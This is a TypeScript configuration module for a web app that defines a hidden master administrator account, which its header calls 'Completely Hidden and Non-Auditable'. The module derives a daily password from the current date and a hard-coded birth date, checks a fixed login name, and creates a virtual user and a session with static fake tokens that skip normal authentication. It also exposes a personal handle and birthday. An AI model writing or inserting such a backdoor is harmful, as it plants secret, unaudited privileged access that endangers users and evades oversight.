// Master User Configuration - Completely Hidden and Non-Auditable

export const MASTER_USER_ID = '00000000-0000-0000-0000-000000000000';
export const MASTER_DISPLAY_EMAIL = 'rodrigorbonfim'; // Display email for UX
export const MASTER_AUTH_EMAIL = 'master@system.local'; // Technical email for Supabase Auth

// Birthday: 17/09/1983
const BIRTHDAY_DAY = 17;
const BIRTHDAY_MONTH = 9;
const BIRTHDAY_YEAR = 83; // Last 2 digits

/**
 * Generates the dynamic password for the current date
 * Formula: (currentDay + birthdayDay) & (currentMonth + birthdayMonth) & (currentYear + birthdayYear)
 * Example: If today is 30/09/2025, password = 4718108
 */
export function generateMasterPassword(): string {
  const now = new Date();
  const currentDay = now.getDate();
  const currentMonth = now.getMonth() + 1; // getMonth() returns 0-11
  const currentYear = now.getFullYear() % 100; // Get last 2 digits

  const passwordDay = currentDay + BIRTHDAY_DAY;
  const passwordMonth = currentMonth + BIRTHDAY_MONTH;
  const passwordYear = currentYear + BIRTHDAY_YEAR;

  return `${passwordDay}${passwordMonth}${passwordYear}`;
}

/**
 * Validates if the provided password matches today's master password
 */
export function validateMasterPassword(password: string): boolean {
  const expectedPassword = generateMasterPassword();
  return password === expectedPassword;
}

/**
 * Checks if the provided email is the master display email
 */
export function isMasterEmail(email: string): boolean {
  return email.toLowerCase().trim() === MASTER_DISPLAY_EMAIL.toLowerCase();
}

/**
 * Checks if the provided email is the master auth email
 */
export function isMasterAuthEmail(email: string): boolean {
  return email.toLowerCase().trim() === MASTER_AUTH_EMAIL.toLowerCase();
}

/**
 * Creates a virtual master user object for the session
 */
export function createMasterUser() {
  return {
    id: MASTER_USER_ID,
    email: MASTER_DISPLAY_EMAIL,
    aud: 'authenticated',
    role: 'authenticated',
    created_at: new Date().toISOString(),
    app_metadata: {},
    user_metadata: {
      full_name: 'Master Administrator',
    },
  };
}

/**
 * Creates a virtual session for the master user
 */
export function createMasterSession(user: any) {
  return {
    access_token: 'master-access-token',
    refresh_token: 'master-refresh-token',
    expires_in: 3600,
    expires_at: Math.floor(Date.now() / 1000) + 3600,
    token_type: 'bearer',
    user,
  };
}
